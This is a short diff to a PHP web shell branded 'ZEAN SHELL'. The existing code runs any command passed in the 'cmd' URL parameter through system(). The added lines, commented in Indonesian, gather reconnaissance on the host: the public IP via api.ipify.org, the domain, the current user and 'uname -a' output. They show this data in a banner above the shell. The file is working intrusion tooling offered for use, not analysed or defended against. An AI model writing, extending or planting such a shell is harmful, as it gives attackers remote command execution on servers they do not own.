@@ -100,6 +100,12 @@ if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
     $output = ob_get_clean();
 }
+
+// Ambil info tambahan
+$public_ip = @file_get_contents('https://api.ipify.org') ?: 'Tidak diketahui';
+$domain = $_SERVER['HTTP_HOST'] ?? 'Tidak diketahui';
+$current_user = get_current_user();
+$uname = trim(shell_exec('uname -a'));
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -205,6 +211,14 @@ if (isset($_GET['cmd'])) {
 </script>
 </head>
 <body>
+
+<div style="background:#2c2f4a; color:#cfd2dc; font-family: monospace; padding:10px; border-radius:8px; margin-bottom:15px;">
+    <b>IP Publik:</b> <?= htmlspecialchars($public_ip) ?> <br>
+    <b>Domain:</b> <?= htmlspecialchars($domain) ?> <br>
+    <b>User:</b> <?= htmlspecialchars($current_user) ?> <br>
+    <b>Uname -a:</b> <?= htmlspecialchars($uname) ?>
+</div>
+
 <h1>🌐 ZEAN SHELL</h1>
 
 <div id="back-button">
